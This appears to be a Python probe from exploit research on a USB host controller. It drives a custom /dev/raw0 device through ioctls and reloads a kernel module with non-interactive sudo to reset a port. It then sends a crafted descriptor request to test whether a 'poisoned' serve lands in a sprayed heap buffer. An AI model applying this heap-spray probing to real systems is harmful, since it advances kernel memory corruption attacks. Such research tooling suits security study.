#!/usr/bin/env python3
"""serve-test.py - did the chip fetch & serve our crit-IN on the sprayed heap?

Stages the crit-IN data phase with 0xAA markers:
  readback all-AA  = chip never touched the buffer (fetch-silent)
  anything else    = the chip fetched our TD and DMA'd its serve in
The kernel's small requests (0x8/0x12) babble -90/-75 because the
poisoned handler serves ~0x80 bytes; our 0x81-class request matches
the poisoned serve size, so it should land cleanly in our buffer.
"""
import ctypes
import fcntl
import os
import struct
import subprocess
import sys
import time

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
RB_SIZE = 4 + 4 + 0x1000
IOC_RW = (3 << 30) | (RB_SIZE << 16) | (ord('R') << 8) | 7


def cyc(fd, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd, IOC_CYC, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def readback(fd, n=16):
    rb = bytearray(RB_SIZE)
    struct.pack_into('<I', rb, 0, n)
    fcntl.ioctl(fd, IOC_RW, rb, True)
    st, = struct.unpack_from('<I', rb, 4)
    return st, bytes(rb[8:8 + n])


def state(fd):
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    return struct.unpack_from('<QIIIIIIII', buf, 0)


def pr():
    subprocess.run(['sudo', '-n', 'insmod', '/tmp/raw0rb/raw0reset.ko',
                    'bdf=0000:04:00.4', 'port=5', 'mode=1'],
                   capture_output=True, timeout=20)
    subprocess.run(['sudo', '-n', 'rmmod', 'raw0reset'],
                   capture_output=True, timeout=10)


def main():
    fd = os.open('/dev/raw0', os.O_RDWR)
    rounds = int(sys.argv[1]) if len(sys.argv) > 1 else 3
    served = 0
    for r in range(rounds):
        print('== round %d: PR port 5 ==' % r)
        pr()
        t0 = time.time()
        got = False
        while time.time() - t0 < 25.0:
            f = state(fd)
            if f[5]:
                got = True
                break
            time.sleep(0.01)
        if not got:
            print('   no capture (khubd debounce) - round wasted')
            time.sleep(1.0)
            continue
        print('   capture: slot=%d' % f[1])
        rc = cyc(fd, bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00]),
                 b'\xAA' * 0x41)
        st, data = readback(fd, 32)
        verdict = 'SILENT' if data == b'\xAA' * 32 else 'SERVED'
        print('   crit-IN rc=%d rb st=%u first32=%s  ->  %s'
              % (rc, st, data.hex(), verdict))
        if verdict == 'SERVED':
            served += 1
    print('rounds served: %d/%d' % (served, rounds))
    os.close(fd)
    return 0


if __name__ == '__main__':
    sys.exit(main())
